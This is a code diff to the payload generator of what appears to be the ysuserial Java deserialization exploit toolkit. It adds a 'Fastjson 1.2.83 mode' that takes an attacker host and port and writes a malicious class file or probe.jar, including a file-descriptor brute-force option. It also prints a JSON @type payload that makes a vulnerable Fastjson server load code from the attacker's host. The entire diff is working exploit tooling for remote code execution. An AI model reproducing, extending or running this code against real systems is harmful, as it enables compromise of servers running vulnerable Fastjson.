@@ -48,6 +48,11 @@ public class GeneratePayload {
 		options.addOption("ncs", "no-com-sun", false, "Force Using org.apache.XXX.TemplatesImpl instead of com.sun.org.apache.XXX.TemplatesImpl");
 		options.addOption("mcl", "mozilla-class-loader", false, "Using org.mozilla.javascript.DefiningClassLoader in TransformerUtil");
 		options.addOption("dcfp", "define-class-from-parameter", true, "Customize parameter name when using DefineClassFromParameter");
+		options.addOption("f83", "fastjson-83", true, "Fastjson 1.2.83 mode: output @JSONType class for getResourceAsStream chain. Format: LHOST:LPORT[:ClassName]");
+		options.addOption("fm", "fastjson-mode", true, "Fastjson 1.2.83 mode type: jdk8-http (default) or fd (probe.jar with /proc/self/fd/N bruteforce)");
+		options.addOption("ft", "fastjson-tag", true, "Fastjson 1.2.83 tag for class/jar naming (alphanumeric+underscore)");
+		options.addOption("fmd", "fastjson-max-fd", true, "Fastjson 1.2.83 fd mode max fd to probe (default 256)");
+		options.addOption("fwd", "fastjson-www-dir", true, "Fastjson 1.2.83 www directory to write probe.jar/probe file (default: output file's parent dir)");
 
 		CommandLineParser parser = new DefaultParser();
 
@@ -138,6 +143,45 @@ public class GeneratePayload {
 			}
 		}
 
+		if (cmdLine.hasOption("fastjson-83")) {
+			FASTJSON_83_MODE = true;
+			String val = cmdLine.getOptionValue("fastjson-83");
+			String[] parts = val.split(":");
+			if (parts.length >= 2) {
+				FASTJSON_83_LHOST = parts[0];
+				FASTJSON_83_LPORT = Integer.parseInt(parts[1]);
+				if (parts.length >= 3) {
+					FASTJSON_83_CLASSNAME = parts[2];
+				}
+			}
+			if (!WRITE_FILE) {
+				// fd 模式默认输出文件名为类名，jdk8-http 为 class 文件
+					if ("fd".equals(FASTJSON_83_MODE_TYPE)) {
+						FASTJSON_83_OUTPUT = FASTJSON_83_CLASSNAME;
+					} else {
+						FASTJSON_83_OUTPUT = FASTJSON_83_CLASSNAME + ".class";
+					}
+			} else {
+				FASTJSON_83_OUTPUT = FILE;
+			}
+		}
+
+		if (cmdLine.hasOption("fastjson-mode")) {
+			FASTJSON_83_MODE_TYPE = cmdLine.getOptionValue("fastjson-mode");
+		}
+
+		if (cmdLine.hasOption("fastjson-tag")) {
+			FASTJSON_83_TAG = cmdLine.getOptionValue("fastjson-tag");
+		}
+
+		if (cmdLine.hasOption("fastjson-max-fd")) {
+			FASTJSON_83_MAX_FD = Integer.parseInt(cmdLine.getOptionValue("fastjson-max-fd"));
+		}
+
+		if (cmdLine.hasOption("fastjson-www-dir")) {
+			FASTJSON_83_WWW_DIR = cmdLine.getOptionValue("fastjson-www-dir");
+		}
+
 		final String payloadType = cmdLine.getOptionValue("gadget");
 		final String command     = cmdLine.getOptionValue("parameters");
 
@@ -165,6 +209,21 @@ public class GeneratePayload {
 			PAYLOAD = object;
 			if (isFromExploit()) {
 				return;
+			}
+
+			// Fastjson 1.2.83 模式：输出 class/probe.jar 而非序列化 payload
+			if (FASTJSON_83_MODE) {
+				String resultPath = org.su18.ysuserial.payloads.handle.GlassHandler
+						.exportForFastjson83(object, FASTJSON_83_LHOST, FASTJSON_83_LPORT,
+								FASTJSON_83_CLASSNAME, FASTJSON_83_OUTPUT);
+				System.err.println("[+] Fastjson 1.2.83 payload written to: " + resultPath);
+				System.err.println("[+] Mode: " + FASTJSON_83_MODE_TYPE);
+				if (!"fd".equals(FASTJSON_83_MODE_TYPE)) {
+					System.err.println("[+] JSON payload: {\"@type\":\"http:.." +
+							org.su18.ysuserial.payloads.util.Fastjson83Util.toPayloadHost(FASTJSON_83_LHOST) +
+							":" + FASTJSON_83_LPORT + "." + FASTJSON_83_CLASSNAME + "\"}");
+				}
+				System.exit(0);
 			}
 
 			OutputStream out;
